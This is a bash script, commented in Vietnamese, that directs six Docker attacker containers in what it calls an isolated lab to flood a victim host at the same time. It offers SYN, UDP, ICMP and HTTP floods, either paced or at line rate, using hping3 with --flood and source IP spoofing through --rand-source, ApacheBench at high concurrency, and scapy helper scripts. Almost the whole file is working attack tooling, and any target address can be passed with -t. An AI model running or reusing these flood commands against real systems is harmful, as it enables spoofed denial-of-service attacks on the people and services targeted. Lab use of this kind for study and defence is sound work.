#!/usr/bin/env bash
# Orchestrator DDoS (bash) - chi dung trong lab co lap.
# Chay ca 6 attacker container dong loat nham victim cua lab.
#
# Cach dung:
#   ./run_ddos.sh syn                         # 6 attacker SYN flood (spoof) 30s
#   ./run_ddos.sh http                        # 6 attacker HTTP flood 30s
#   ./run_ddos.sh udp                         # 6 attacker UDP flood (spoof) 30s
#   ./run_ddos.sh icmp                        # 6 attacker ICMP echo flood (spoof) 30s
#   ./run_ddos.sh syn -t 172.30.0.10 -d 30    # chon target + thoi luong
#   ./run_ddos.sh syn -r 400                  # SYN co pacing 400 pps/nguon (0 = toi da)
#   ./run_ddos.sh syn -i max                  # cuong do TOI DA: hping3 --flood (6 nguon spoof)
#   ./run_ddos.sh http -i max                 # cuong do TOI DA: ab -k -c 500 (6 nguon L7)
#   ./run_ddos.sh udp -i max                  # cuong do TOI DA: hping3 --udp --flood (6 nguon spoof)
#   ./run_ddos.sh icmp -i max                 # cuong do TOI DA: hping3 --icmp --flood (6 nguon spoof)
#   ./run_ddos.sh syn -i max -r 50000         # max co gioi han ~50k pps/nguon (ramp an toan)
#
# intensity: paced (mac dinh) = scapy/http_flood.py co dieu tiet; max = hping3/ab line-rate.
# CANH BAO: -i max sinh luu luong RAT LON. Chi chay trong lab co lap, co san 'pkill hping3/ab'.
#
# Ghi chu: neu user chua reload nhom docker trong phien dang nhap, script tu chay
# lai chinh no duoi "sg docker -c ..." (khong can sudo khi da la thanh vien nhom docker).
set -euo pipefail

# --- tu re-exec duoi nhom docker neu khong truy cap duoc daemon ---
if ! docker version >/dev/null 2>&1; then
  if id -nG "$(id -un)" | tr ' ' '\n' | grep -qx docker; then
    exec sg docker -c "$(printf '%q ' "$0" "$@")"
  fi
  echo "[!] Khong truy cap duoc Docker daemon va user khong o nhom 'docker'." >&2
  exit 1
fi

MODE="syn"
TARGET="172.30.0.10"
DURATION=30
PPS=""          # rong = khong truyen --pps (syn_flood tu hieu la toi da)
INTENSITY="paced"
MAXCONC=500     # che do max http: so ket noi dong thoi moi nguon cho ab

# tham so dau tien (neu co) la mode syn|http|udp|icmp
if [[ "${1:-}" == "syn" || "${1:-}" == "http" || "${1:-}" == "udp" || "${1:-}" == "icmp" ]]; then
  MODE="$1"; shift
fi
while [[ $# -gt 0 ]]; do
  case "$1" in
    -t|--target)    TARGET="$2"; shift 2 ;;
    -d|--duration)  DURATION="$2"; shift 2 ;;
    -r|--pps)       PPS="$2"; shift 2 ;;
    -i|--intensity) INTENSITY="$2"; shift 2 ;;
    syn|http|udp|icmp) MODE="$1"; shift ;;
    *) echo "[!] Tham so la: $1" >&2; exit 2 ;;
  esac
done
if [[ "$INTENSITY" != "paced" && "$INTENSITY" != "max" ]]; then
  echo "[!] -i/--intensity chi nhan: paced | max" >&2; exit 2
fi

ATTACKERS=(attacker1 attacker2 attacker3 attacker4 attacker5 attacker6)
echo "[*] Bat dau DDoS mode=$MODE intensity=$INTENSITY tu ${#ATTACKERS[@]} nguon -> $TARGET trong ${DURATION}s"

pids=()
for a in "${ATTACKERS[@]}"; do
  if [[ "$MODE" == "syn" ]]; then
    if [[ "$INTENSITY" == "max" ]]; then
      # cuong do toi da: hping3 line-rate, --rand-source gia mao hang nghin IP nguon
      cmd=(docker exec "$a" timeout "$DURATION" hping3 -S -p 80 -q --rand-source)
      if [[ -n "$PPS" ]]; then cmd+=(-i "u$((1000000 / PPS))"); else cmd+=(--flood); fi
      cmd+=("$TARGET")
    else
      # SYN flood scapy co pacing: spoof IP, dung timeout de dung dung thoi luong
      cmd=(docker exec "$a" timeout "$DURATION" python3 /app/syn_flood.py "$TARGET" -p 80 --spoof)
      [[ -n "$PPS" ]] && cmd+=(--pps "$PPS")
    fi
  elif [[ "$MODE" == "udp" ]]; then
    if [[ "$INTENSITY" == "max" ]]; then
      # cuong do toi da: hping3 UDP flood line-rate, --rand-source gia mao IP nguon
      cmd=(docker exec "$a" timeout "$DURATION" hping3 --udp -p 80 -q --rand-source)
      if [[ -n "$PPS" ]]; then cmd+=(-i "u$((1000000 / PPS))"); else cmd+=(--flood); fi
      cmd+=("$TARGET")
    else
      # UDP flood scapy co pacing: spoof IP (connectionless nen spoof duoc nhu syn)
      cmd=(docker exec "$a" timeout "$DURATION" python3 /app/udp_flood.py "$TARGET" -p 80 --spoof)
      [[ -n "$PPS" ]] && cmd+=(--pps "$PPS")
    fi
  elif [[ "$MODE" == "icmp" ]]; then
    if [[ "$INTENSITY" == "max" ]]; then
      # cuong do toi da: hping3 ICMP echo flood line-rate, --rand-source gia mao IP nguon
      cmd=(docker exec "$a" timeout "$DURATION" hping3 --icmp -q --rand-source)
      if [[ -n "$PPS" ]]; then cmd+=(-i "u$((1000000 / PPS))"); else cmd+=(--flood); fi
      cmd+=("$TARGET")
    else
      # ICMP flood co pacing
      cmd=(docker exec "$a" timeout "$DURATION" hping3 --icmp -q --rand-source)
      cmd+=(-i "u$((1000000 / ${PPS:-400}))")
      cmd+=("$TARGET")
    fi
  else
    if [[ "$INTENSITY" == "max" ]]; then
      # L7 cuong do cao: ab keep-alive, concurrency cao, tu dung sau -t giay
      cmd=(docker exec "$a" timeout "$DURATION" ab -k -c "$MAXCONC" -t "$DURATION" -n 100000000 "http://$TARGET/")
    else
      # HTTP flood L7 (urllib): tu dung sau -d giay
      cmd=(docker exec "$a" python3 /app/http_flood.py "$TARGET" -p 80 -t 20 -d "$DURATION")
    fi
  fi
  "${cmd[@]}" &
  pids+=($!)
done

echo "[*] Dang tan cong... (doi ${DURATION}s)"
# timeout gui SIGTERM -> syn_flood khong in tong; http_flood tu in req thanh cong.
wait "${pids[@]}" || true
echo "[*] DDoS ket thuc."
